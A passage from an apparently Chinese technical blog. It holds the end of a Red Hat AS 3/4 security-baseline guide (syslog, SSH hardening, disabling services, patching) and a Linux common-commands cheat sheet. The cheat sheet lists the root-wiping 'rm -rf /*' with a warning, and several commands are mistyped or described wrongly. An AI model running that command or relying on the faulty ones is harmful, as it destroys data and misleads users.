定义为需要保存的设备相关安全事件。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="九、统一远程日志服务器配置"><a href="#九、统一远程日志服务器配置" class="headerlink" title="九、统一远程日志服务器配置"></a>九、统一远程日志服务器配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：统一远程日志服务器配置</span><br><span class="line">配置要求：当前系统应配置远程日志功能，将需要重点关注的日志内容传输到日志服务器进行备份。</span><br><span class="line">操作指南：# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">检查方法：配置了远程日志服务器为符合</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">          修改配置文件vi /etc/syslog.conf，</span><br><span class="line">          加上这一行：</span><br><span class="line">          *.* @192.168.0.1</span><br><span class="line">          可以将&quot;*.*&quot;替换为你实际需要的日志信息。比如：kern.* / mail.* 等等；可以将此处192.168.0.1替换为实际的IP或域名。</span><br><span class="line">          重新启动syslog服务，执行下列命令：</span><br><span class="line">          services syslogd restart</span><br><span class="line">          2、补充操作说明</span><br><span class="line">          注意：*.*和@之间为一个Tab</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="十、设置history时间戳"><a href="#十、设置history时间戳" class="headerlink" title="十、设置history时间戳"></a>十、设置history时间戳</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：设置history时间戳</span><br><span class="line">配置要求：配置history时间戳，便于审计。</span><br><span class="line">操作指南：# cat /etc/bashrc查看是否有对应配置</span><br><span class="line">检查方法：已添加，如：“export HISTTIMEFORMAT=&quot;%F %T”配置为符合。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          在/etc/bashrc文件中增加如下行：</span><br><span class="line">          export HISTTIMEFORMAT=&quot;%F %T</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="十一、ssh登录配置"><a href="#十一、ssh登录配置" class="headerlink" title="十一、ssh登录配置"></a>十一、ssh登录配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：SSH登录配置</span><br><span class="line">配置要求：系统应配置使用SSH等加密协议进行远程登录维护，并安全配置SSHD的设置。不使用TELENT进行远程登录维护。</span><br><span class="line">操作指南：1、查看SSH服务状态：# ps –elf|grep ssh；</span><br><span class="line">          2、查看telnet服务状态：# ps –elf|grep telnet。</span><br><span class="line">检查方法：1、	不能使用telnet进行远程维护；</span><br><span class="line">          2、	应使用SSH进行远程维护；</span><br><span class="line">          3、	SSH配置要符合如下要求；</span><br><span class="line">              Protocol  2 #使用ssh2版本</span><br><span class="line">              X11Forwarding yes #允许窗口图形传输使用ssh加密</span><br><span class="line">              IgnoreRhosts  yes#完全禁止SSHD使用.rhosts文件</span><br><span class="line">              RhostsAuthentication no #不设置使用基于rhosts的安全验证</span><br><span class="line">              RhostsRSAAuthentication no #不设置使用RSA算法的基于rhosts的安全验证</span><br><span class="line">              HostbasedAuthentication no #不允许基于主机白名单方式认证</span><br><span class="line">              PermitRootLogin no #不允许root登录</span><br><span class="line">              PermitEmptyPasswords no #不允许空密码</span><br><span class="line">              Banner /etc/motd  #设置ssh登录时显示的banner</span><br><span class="line">          4、以上条件都满足为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            编辑 sshd_config，添加相关设置，SSHD相关安全设置选项参考检查方法中的描述。</span><br><span class="line">          2、补充操作说明</span><br><span class="line">            查看SSH服务状态：# ps –elf|grep ssh</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="十二、关闭不必要的服务"><a href="#十二、关闭不必要的服务" class="headerlink" title="十二、关闭不必要的服务"></a>十二、关闭不必要的服务</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关闭不必要的系统服务</span><br><span class="line">配置要求：根据每台机器的不同角色，关闭不需要的系统服务。操作指南中的服务项提供参考，根据服务器的角色和应用情况对启动项进行修改。</span><br><span class="line">如无特殊需要，应关闭Sendmail、Telnet、Bind等服务。</span><br><span class="line">操作指南：执行命令 #chkconfig --list，查看哪些服务开放。</span><br><span class="line">检查方法：与管理员确认无用服务已关闭</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">        使用如下方式禁用不必要的服务</span><br><span class="line">        #service &lt;服务名&gt; stop</span><br><span class="line">        #chkconfig --level 35 off</span><br><span class="line">        2、参考说明</span><br><span class="line">        Linux/Unix系统服务中，部分服务存在较高安全风险，应当禁用，包括：</span><br><span class="line">        “lpd”，此服务为行式打印机后台程序，用于假脱机打印工作的UNIX后台程序，此服务通常情况下不用，建议禁用；</span><br><span class="line">        “telnet”，此服务采用明文传输数据，登陆信息容易被窃取，建议用ssh代替；</span><br><span class="line">        “routed”，此服务为路由守候进程，使用动态RIP路由选择协议，建议禁用；</span><br><span class="line">        “sendmail”，此服务为邮件服务守护进程，非邮件服务器应将其关闭；</span><br><span class="line">        “Bluetooth”，此服务为蓝牙服务，如果不需要蓝牙服务时应关闭；</span><br><span class="line">        “identd”，此服务为AUTH服务，在提供用户信息方面与finger类似，一般情况下该服务不是必须的，建议关闭；</span><br><span class="line">        “xfs”，此服务为Linux中X Window的字体服务，关于该服务历史上出现过信息泄露和拒绝服务等漏洞，应以减少系统风险；</span><br><span class="line">        R服务（“rlogin”、“rwho”、“rsh”、“rexec”），R服务设计上存在严重的安全缺陷，仅适用于封闭环境中信任主机之间便捷访问，</span><br><span class="line">        其他场合下均必须禁用；</span><br><span class="line">        基于inetd/xinetd的服务（daytime、chargen、echo等），此类服务建议禁用。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="十三、禁止ctr-alt-del键盘关闭命令"><a href="#十三、禁止ctr-alt-del键盘关闭命令" class="headerlink" title="十三、禁止ctr+alt+del键盘关闭命令"></a>十三、禁止ctr+alt+del键盘关闭命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：禁止Control-Alt-Delete键盘关闭命令</span><br><span class="line">配置要求：应禁止使用Control-Alt-Delete组合键重启服务器，防止误操作</span><br><span class="line">操作指南：命令cat /etc/inittab，查看配置</span><br><span class="line">检查方法：/etc/inittab 中应有：“#ca::ctrlaltdel:/sbin/shutdown -t3 -r now”配置为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            在“/etc/inittab” 文件中注释掉下面这行（使用#）： ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            改为： #ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            为了使此改动生效，输入下面这个命令： # /sbin/init q</span><br><span class="line">        2、补充说明</span><br><span class="line">            禁止ctl-alt-del使得在控制台直接按ctl-alt-del不能重新启动计算机。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="十四、安装操作系统补丁"><a href="#十四、安装操作系统补丁" class="headerlink" title="十四、安装操作系统补丁"></a>十四、安装操作系统补丁</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安装操作系统更新补丁</span><br><span class="line">配置要求：安装操作系统更新补丁，修复系统漏洞</span><br><span class="line">操作指南：1、查看当前系统补丁版本</span><br><span class="line">          2、检查官网当前系统版本是否发布安全更新。</span><br><span class="line">检查方法：版本应保持为最新</span><br><span class="line">配置方法：通过访问</span><br><span class="line">https://rhn.redhat.com/errata/下载补丁安装包，在打开的页面上，选择与自己使用相对应的系统后，点击连接进入补丁包下载列表界面，</span><br><span class="line">选择需要的补丁下载。</span><br><span class="line">         下载的补丁为rpm安装包，将该安装包复制到目标系统上，使用命令rpm –ivh xxx.rpm进行安装，随后重新启动系统，</span><br><span class="line">         检查所安装补丁的服务或应用程序是否运行正常，即完成该补丁的安装和升级工作。</span><br><span class="line">适用版本：Linux Redhat AS 3 Linux Redhat AS 4</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安全技术</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>安全基线</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常用命令</title>
    <url>/archives/d0edc1ed.html</url>
    <content><![CDATA[<h1 id="linux常用命令"><a href="#linux常用命令" class="headerlink" title="linux常用命令"></a>linux常用命令</h1><h1 id="linux系统的文件结构"><a href="#linux系统的文件结构" class="headerlink" title="linux系统的文件结构"></a>linux系统的文件结构</h1><p>Linux系统命令行的含义</p>
<p><a href="linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%204de50be84c4e44a5b0a8fb15c5169a19.csv">linux文件系统结构</a></p>
<h1 id="Linux系统命令行的含义"><a href="#Linux系统命令行的含义" class="headerlink" title="Linux系统命令行的含义"></a>Linux系统命令行的含义</h1><p>示例：root@app00:~#</p>
<p>root            &#x2F;&#x2F;用户名，root为超级用户<br>@               &#x2F;&#x2F;分隔符<br>app00        &#x2F;&#x2F;主机名称<br>~               &#x2F;&#x2F;当前所在目录，默认用户目录为~，会随着目录切换而变化，例如：（root@app00:&#x2F;bin# ，当前位置在bin目录下）</p>
<h1 id="表示当前用户是超级用户，普通用户为-，例如：（”yao-app00-root-”-，表示使用用户”yao”访问-root文件夹"><a href="#表示当前用户是超级用户，普通用户为-，例如：（”yao-app00-root-”-，表示使用用户”yao”访问-root文件夹" class="headerlink" title="&#x2F;&#x2F;表示当前用户是超级用户，普通用户为$，例如：（”yao@app00:&#x2F;root$” ，表示使用用户”yao”访问&#x2F;root文件夹"></a>&#x2F;&#x2F;表示当前用户是超级用户，普通用户为$，例如：（”yao@app00:&#x2F;root$” ，表示使用用户”yao”访问&#x2F;root文件夹</h1><h1 id="命令的组成"><a href="#命令的组成" class="headerlink" title="命令的组成"></a>命令的组成</h1><p>示例：命令 参数名 参数值</p>
<h1 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h1><h2 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h2><ol>
<li><p>立刻关机</p>
<p> shutdown -h now 或者 poweroff</p>
</li>
<li><p>两分钟后关机</p>
<p>   shutdown -h 2</p>
</li>
</ol>
<h2 id="关闭系统"><a href="#关闭系统" class="headerlink" title="关闭系统"></a>关闭系统</h2><ol>
<li><p>立刻重启</p>
<p>  shutdown -r now 或者 reboot</p>
</li>
<li><p>两分钟后重启</p>
<p> shutdown -r 2</p>
</li>
</ol>
<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><p>ifconfig –help &#x2F;&#x2F;查看 ifconfig 命令的用法</p>
<h2 id="命令说明书"><a href="#命令说明书" class="headerlink" title="命令说明书"></a>命令说明书</h2><p>man shutdown &#x2F;&#x2F;打开命令说明后，可按”q”键退出</p>
<h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><p>su - yao               &#x2F;&#x2F;切换为用户”yao”,输入后回车需要输入该用户的密码<br>  exit                 &#x2F;&#x2F;退出当前用户</p>
<h1 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h1><h2 id="切换目录"><a href="#切换目录" class="headerlink" title="切换目录"></a>切换目录</h2><p>cd &#x2F;                             &#x2F;&#x2F;切换到根目录<br>cd &#x2F;bin                        &#x2F;&#x2F;切换到根目录下的bin目录<br>cd ..&#x2F;                           &#x2F;&#x2F;切换到上一级目录 或者使用命令：cd ..<br>cd ~                           &#x2F;&#x2F;切换到home目录<br>cd -                            &#x2F;&#x2F;切换到上次访问的目录<br>cd xx(文件夹名)         &#x2F;&#x2F;切换到本目录下的名为xx的文件目录，如果目录不存在报错<br>cd &#x2F;xxx&#x2F;xx&#x2F;x              &#x2F;&#x2F;可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</p>
<h2 id="查看目录"><a href="#查看目录" class="headerlink" title="查看目录"></a>查看目录</h2><p>ls                    &#x2F;&#x2F;查看当前目录下的所有目录和文件<br>ls -a                &#x2F;&#x2F;查看当前目录下的所有目录和文件（包括隐藏的文件）<br>ls -l                &#x2F;&#x2F;列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令”ll”效果一样<br>ls &#x2F;bin              &#x2F;&#x2F;查看指定目录下的所有目录和文件</p>
<h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p>mkdir tools              &#x2F;&#x2F;在当前目录下创建一个名为tools的目录<br>  mkdir &#x2F;bin&#x2F;tools     &#x2F;&#x2F;在指定目录下创建一个名为tools的目录</p>
<h2 id="删除目录与文件"><a href="#删除目录与文件" class="headerlink" title="删除目录与文件"></a>删除目录与文件</h2><p>rm 文件名              &#x2F;&#x2F;删除当前目录下的文件<br>rm -f 文件名           &#x2F;&#x2F;删除当前目录的的文件（不询问）<br>rm -r 文件夹名         &#x2F;&#x2F;递归删除当前目录下此名的目录<br>rm -rf 文件夹名        &#x2F;&#x2F;递归删除当前目录下此名的目录（不询问）<br>rm -rf *              &#x2F;&#x2F;将当前目录下的所有目录和文件全部删除<br>rm -rf &#x2F;*             &#x2F;&#x2F;将根目录下的所有文件全部删除【慎用！相当于格式化系统】</p>
<h2 id="修改目录"><a href="#修改目录" class="headerlink" title="修改目录"></a>修改目录</h2><p>mv 当前目录名 新目录名        &#x2F;&#x2F;修改目录名，同样适用与文件操作<br>mv &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt       &#x2F;&#x2F;将&#x2F;usr&#x2F;tmp目录下的tool目录剪切到 &#x2F;opt目录下面<br>mv -r &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt    &#x2F;&#x2F;递归剪切目录中所有文件和文件夹 &#x2F;&#x2F;该命令错误</p>
<h2 id="拷贝目录"><a href="#拷贝目录" class="headerlink" title="拷贝目录"></a>拷贝目录</h2><p>cp &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt       &#x2F;&#x2F;将&#x2F;usr&#x2F;tmp目录下的tool目录复制到 &#x2F;opt目录下面<br>  cp -r &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt    &#x2F;&#x2F;递归剪复制目录中所有文件和文件夹</p>
<p>cp -a a.txt b.txt   &#x2F;&#x2F;复制时保留文件的元数据，既保留所属用户所属组等信息</p>
<p>cp -f a.txt b.txt &#x2F;&#x2F;强制覆盖目标目录同名文件，因为别名的存在可能不成功，需要撤销默认定义的别名</p>
<h2 id="搜索目录"><a href="#搜索目录" class="headerlink" title="搜索目录"></a>搜索目录</h2><p>find &#x2F;bin -name ‘a*’ &#x2F;&#x2F;查找&#x2F;bin目录下的所有以a开头的文件或者目录</p>
<h2 id="查看当前目录"><a href="#查看当前目录" class="headerlink" title="查看当前目录"></a>查看当前目录</h2><p>pwd &#x2F;&#x2F;显示当前位置路径</p>
<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="新增文件"><a href="#新增文件" class="headerlink" title="新增文件"></a>新增文件</h2><p>touch a.txt &#x2F;&#x2F;在当前目录下创建名为a的txt文件（文件不存在），如果文件存在，将文件时间属性修改为当前系统时间</p>
<h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p>rm 文件名              &#x2F;&#x2F;删除当前目录下的文件<br>  rm -f 文件名           &#x2F;&#x2F;删除当前目录的的文件（不询问）</p>
<h2 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h2><p>vi 文件名              &#x2F;&#x2F;打开需要编辑的文件<br>–进入后，操作界面有三种模式：命令模式（command mode）、插入模式（Insert mode）和底行模式（last line mode）<br>命令模式<br>-刚进入文件就是命令模式，通过方向键控制光标位置，<br>-使用命令”dd”删除当前整行<br>-使用命令”&#x2F;字段”进行查找<br>-按”i”在光标所在字符前开始插入<br>-按”a”在光标所在字符后开始插入<br>-按”o”在光标所在行的下面另起一新行插入<br>-按”：”进入底行模式<br>插入模式<br>-此时可以对文件内容进行编辑，左下角会显示 “– 插入 –””<br>-按”ESC”进入底行模式<br>底行模式<br>-退出编辑：      :q<br>-强制退出：      :q!<br>-保存并退出：    :wq</p>
<p>##操作步骤示例##</p>
<p>1.保存文件：按”ESC” -&gt; 输入”:” -&gt; 输入”wq”,回车     &#x2F;&#x2F;保存并退出编辑<br>2.取消操作：按”ESC” -&gt; 输入”:” -&gt; 输入”q!”,回车     &#x2F;&#x2F;撤销本次修改并退出编辑</p>
<p>##补充##</p>
<p>vim +10 filename.txt                   &#x2F;&#x2F;打开文件并跳到第10行<br>vim -R &#x2F;etc&#x2F;passwd                     &#x2F;&#x2F;以只读模式打开文件</p>
<h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>cat a.txt          &#x2F;&#x2F;查看文件最后一屏内容<br>less a.txt         &#x2F;&#x2F;PgUp向上翻页，PgDn向下翻页，”q”退出查看<br>more a.txt         &#x2F;&#x2F;显示百分比，回车查看下一行，空格查看下一页，”q”退出查看<br>tail -100 a.txt    &#x2F;&#x2F;查看文件的后100行，”Ctrl+C”退出查看</p>
<p>tail -f a.txt</p>
<p>sort</p>
<p>uniq</p>
<p>od</p>
<p>strings</p>
<h1 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h1><p>alias ^c&#x3D;’clear’ &#x2F;&#x2F;定义命令的别名</p>
<p>unalias clear &#x2F;&#x2F;撤销别名</p>
<h1 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h1><h2 id="权限说明"><a href="#权限说明" class="headerlink" title="权限说明"></a>权限说明</h2><p>文件权限简介：’r’ 代表可读（4），’w’ 代表可写（2），’x’ 代表执行权限（1），括号内代表”8421法”<br>##文件权限信息示例：-rwxrw-r–<br>-第一位：’-‘就代表是文件，’d’代表是文件夹<br>-第一组三位：拥有者的权限<br>-第二组三位：拥有者所在的组，组员的权限<br>-第三组三位：代表的是其他用户的权限</p>
<h2 id="文件权限-1"><a href="#文件权限-1" class="headerlink" title="文件权限"></a>文件权限</h2><p>普通授权    chmod +x a.txt </p>
<p>chmod a&#x3D;rwx a.txt<br>  8421法     chmod 777 a.txt     &#x2F;&#x2F;1+2+4&#x3D;7，”7”说明授予所有权限</p>
<p>文件默认最高权限 666</p>
<p>目录默认最高权限777</p>
<p>权限掩码umask 0022</p>
<p>权限掩码设置为333时，计算的默认权限应为333，实际却为444，因为文件默认没有可执行权限，如果为333得话则拥有了可执行权限，故3+1得到读权限</p>
<p><strong>SUID-setuid</strong></p>
<p>临时赋予当前用户可执行文件所有者的权限。</p>
<p>chmod u+s &#x2F;use&#x2F;bin&#x2F;rm</p>
<p><strong>SGID-setgid</strong></p>
<p>临时赋予当前用户可执行文件所有者的权限</p>
<p>具有sgid权限的目录下的文件的属组继承其父目录的属组</p>
<p>chmod g+s &#x2F;tmp&#x2F;a</p>
<p><strong>stickybit 粘滞位</strong></p>
<p>在设置了粘滞位的目录下面的文件，只有文件的属主或者root才拥有删除的权限</p>
<p>chmod o+t &#x2F;tmp&#x2F;a</p>
<p>一般&#x2F;tmp配置有粘滞位</p>
<h2 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h2><p>setfacl -m u:armandhe:rwx a.txt &#x2F;&#x2F;给用户armandhe设置acl</p>
<p>setfacl -m m::rwx filename &#x2F;&#x2F;设置文件的最大有效权限为rwx</p>
<p>setfacl -x u:armandhe:rw filename &#x2F;&#x2F;删除armandhe的rw权限</p>
<p>setfacl -x g:armandhe:rw filename &#x2F;&#x2F;删除组armandhe的rw权限</p>
<p>setfacl -b a &#x2F;&#x2F;删除所有acl权限</p>
<p>setfacl -m d:u:armandhe:rw dirname &#x2F;&#x2F;指定默认acl权限，只对目录生效，以后新建的所有子文件都继承该目录的acl权限，只针对新建的文件生效</p>
<p>setfacl -m u:armandhe:rwx -R&#x2F;tmp &#x2F;&#x2F;指定递归acl权限，父目录下的所有文件都继承父目录的acl</p>
<p>getacl a.txt &#x2F;&#x2F;查看文件的acl信息</p>
<p>mount &#x2F;&#x2F;查看系统挂载信息</p>
<p>dumpe2fs -h 分区 查看指定分区文件系统详细信息</p>
<h2 id="修改用户使用命令权限执行系统操作"><a href="#修改用户使用命令权限执行系统操作" class="headerlink" title="修改用户使用命令权限执行系统操作"></a>修改用户使用命令权限执行系统操作</h2><p>有些命令普通用户并没有执行的权限，那么怎么让某一个用户拥有执行这些命令的权限呢？</p>
<p>修改&#x2F;etc&#x2F;sudoers文件来赋予用户操作系统的权限：可使用命令visudo 直接跳到该文件编辑</p>
<p>配置文件内容：</p>
<p>root ALL&#x3D;(ALL)  ALL </p>
<p>第一个参数-用户名，第二个参数-用户从哪儿登录-主机IP地址&#x2F;prefix，第三个参数-以什么身份运行，最后一个参数-哪些命令-命令的绝对路径，通过逗号分割</p>
<p>这样修改太过麻烦暴力，可以通过将用户加入到wheel组中来实现赋予普通用户系统级权限。</p>
<p>armandhe ALL&#x3D;(root) NOPASSWD:&#x2F;usr&#x2F;passwd [a-zA-z]* ,!&#x2F;usr&#x2F;passwd root &#x2F;&#x2F;不需要输入当前用户密码即可执行passwd命令 不允许修改root用户的密码</p>
<p>armandhe ALL&#x3D;(root) &#x2F;usr&#x2F;ifconfig,! &#x2F;usr&#x2F;ifconfig [a-zA-Z]* down &#x2F;&#x2F;可以更改IP地址，不可以关闭网卡</p>
<p>修改之后，切换到用户armandhe，通过在命令前面添加sudo 来获取root用户的执行权限。</p>
<h1 id="打包与解压"><a href="#打包与解压" class="headerlink" title="打包与解压"></a>打包与解压</h1><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>.zip、.rar        &#x2F;&#x2F;windows系统中压缩文件的扩展名<br>.tar              &#x2F;&#x2F;Linux中打包文件的扩展名<br>.gz               &#x2F;&#x2F;Linux中压缩文件的扩展名<br>.tar.gz           &#x2F;&#x2F;Linux中打包并压缩文件的扩展名</p>
<p>zcat compress_file &#x2F;&#x2F;查看压缩文件的内容</p>
<p>gzip -d a.txt.gz &#x2F;&#x2F;解压</p>
<p>gzip -c a.txt &gt; a.txt.gz &#x2F;&#x2F;保留源文件</p>
<p>tar -xf jack.txt.tar -C &#x2F;tmp&#x2F;  &#x2F;&#x2F;解压另存为</p>
<p>tar -cft jack tar a.txt b.txt &#x2F;&#x2F; 列出包中文件</p>
<h2 id="打包文件"><a href="#打包文件" class="headerlink" title="打包文件"></a>打包文件</h2><p>tar -zcvf 打包压缩后的文件名 要打包的文件<br>  参数说明：z：调用gzip压缩命令进行压缩; c：打包文件; v：显示运行过程; f：指定文件名;<br>  示例：<br> tar -zcvf a.tar file1 file2,…      &#x2F;&#x2F;多个文件压缩打包</p>
<h2 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h2><p>tar -zxvf a.tar                      &#x2F;&#x2F;解包至当前目录<br>tar -zxvf a.tar -C &#x2F;usr——        &#x2F;&#x2F;指定解压的位置</p>
<p>zip <a href="http://a.txt.zip/">a.txt.zip</a> a.txt<br>unzip test.zip             &#x2F;&#x2F;解压*.zip文件<br>unzip -l test.zip          &#x2F;&#x2F;查看*.zip文件的内容</p>
<h1 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h1><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>find . -name “*.c”     &#x2F;&#x2F;将目前目录及其子目录下所有延伸档名是 c 的文件列出来<br>find . -type f         &#x2F;&#x2F;将目前目录其其下子目录中所有一般文件列出<br>find . -ctime -20      &#x2F;&#x2F;将目前目录及其子目录下所有最近 20 天内更新过的文件列出<br>find &#x2F;var&#x2F;log -type f -mtime +7 -ok rm {} ;     &#x2F;&#x2F;查找&#x2F;var&#x2F;log目录中更改时间在7日以前的普通文件，并在删除之前询问它们<br>find . -type f -perm 644 -exec ls -l {} ;       &#x2F;&#x2F;查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件<br>find &#x2F; -type f -size 0 -exec ls -l {} ;         &#x2F;&#x2F;为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</p>
<p>find &#x2F; -size +2M &#x2F;&#x2F;查找大于两兆的文件</p>
<p>find &#x2F; -size -2K &#x2F;&#x2F;查找小于2k的文件</p>
<p>ls | xargs wc &#x2F;&#x2F;将前面的命令的执行结果作为后一个命令的参数</p>
<h2 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h2><p>whereis ls &#x2F;&#x2F;将和ls文件相关的文件都查找出来，命令所在目录以及手册所在目录</p>
<h2 id="which"><a href="#which" class="headerlink" title="which"></a>which</h2><p>说明：which指令会在环境变量$PATH设置的目录里查找符合条件的文件。<br>  which bash             &#x2F;&#x2F;查看指令”bash”的绝对路径</p>
<h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>说明：sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。需要输入自己账户密码。<br>使用权限：在 &#x2F;etc&#x2F;sudoers 中有出现的使用者<br>sudo -l                              &#x2F;&#x2F;列出目前的权限<br>$ sudo -u yao vi ~www&#x2F;index.html    &#x2F;&#x2F;以 yao 用户身份编辑  home 目录下www目录中的 index.html 文件</p>
<h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>grep -i “the”  demo_file              &#x2F;&#x2F;在文件中查找字符串(不区分大小写)<br>grep -A 3 -i “example”  demo_text     &#x2F;&#x2F;输出成功匹配的行，以及该行之后的三行苏<br>grep -r “ramesh”  *                   &#x2F;&#x2F;在一个文件夹中递归查询包含指定字符串的文件</p>
<p>grep -E &#x2F;&#x2F;使用扩展正则表达式</p>
<p>grep -o &#x2F;&#x2F;输出匹配部分</p>
<p>egrep &#x2F;&#x2F;扩展正则表达式</p>
<p>grep -c &#x2F;&#x2F;输出匹配到的行</p>
<h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>说明：service命令用于运行System V init脚本，这些脚本一般位于&#x2F;etc&#x2F;init.d文件下，这个命令可以直接运行这个文件夹里面的脚本，而不用加上路径<br>service ssh status      &#x2F;&#x2F;查看服务状态<br>service –status-all    &#x2F;&#x2F;查看所有服务状态<br>service ssh restart     &#x2F;&#x2F;重启服务</p>
<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>说明：这个命令用于显示系统当前内存的使用情况，包括已用内存、可用内存和交换内存的情况<br>  free -g            &#x2F;&#x2F;以G为单位输出内存的使用量，-g为GB，-m为MB，-k为KB，-b为字节<br>  free -t            &#x2F;&#x2F;查看所有内存的汇总</p>
<p><code>free -s N //每N秒打印一次</code></p>
<p><code>free -c  N  //打印N次后停止</code></p>
<h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><p>top &#x2F;&#x2F;显示当前系统中占用资源最多的一些进程, shift+m 按照内存大小查看</p>
<h2 id="df"><a href="#df" class="headerlink" title="df"></a>df</h2><p>说明：显示文件系统的磁盘使用情况<br>  df -h            &#x2F;&#x2F;一种易看的显示</p>
<h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p>mount &#x2F;dev&#x2F;sdb1 &#x2F;u01              &#x2F;&#x2F;挂载一个文件系统，需要先创建一个目录，然后将这个文件系统挂载到这个目录上<br>dev&#x2F;sdb1 &#x2F;u01 ext2 defaults 0 2   &#x2F;&#x2F;添加到fstab中进行自动挂载，这样任何时候系统重启的时候，文件系统都会被加载 0是否检查 2转换</p>
<h2 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h2><p>说明：uname可以显示一些重要的系统信息，例如内核名称、主机名、内核版本号、处理器类型之类的信息<br>  uname -a</p>
<p>uname -r &#x2F;&#x2F;内核版本</p>
<p>uname -m &#x2F;&#x2F;架构</p>
<p>uname -s &#x2F;&#x2F;设备类型</p>
<p>uname -o &#x2F;&#x2F;操作系统</p>
<p>unam -n &#x2F;&#x2F;node信息，用户名</p>
<h2 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h2><p>说明：安装插件命令<br>  yum install httpd      &#x2F;&#x2F;使用yum安装apache<br>  yum update httpd       &#x2F;&#x2F;更新apache<br>  yum remove httpd       &#x2F;&#x2F;卸载&#x2F;删除apache</p>
<h2 id="rpm"><a href="#rpm" class="headerlink" title="rpm"></a>rpm</h2><p>说明：插件安装命令<br>rpm -ivh httpd-2.2.3-22.0.1.el5.i386.rpm      &#x2F;&#x2F;使用rpm文件安装apache<br>rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      &#x2F;&#x2F;使用rpm更新apache<br>rpm -ev httpd                                 &#x2F;&#x2F;卸载&#x2F;删除apache</p>
<h2 id="date"><a href="#date" class="headerlink" title="date"></a>date</h2><p>date -s “01&#x2F;31&#x2F;2010 23:59:53” &#x2F;&#x2F;&#x2F;设置系统时间</p>
<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>说明：使用wget从网上下载软件、音乐、视频<br>示例：wget <a href="http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz">http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz</a><br>&#x2F;&#x2F;下载文件并以指定的文件名保存文件<br>wget -O nagios.tar.gz <a href="http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz">http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz</a></p>
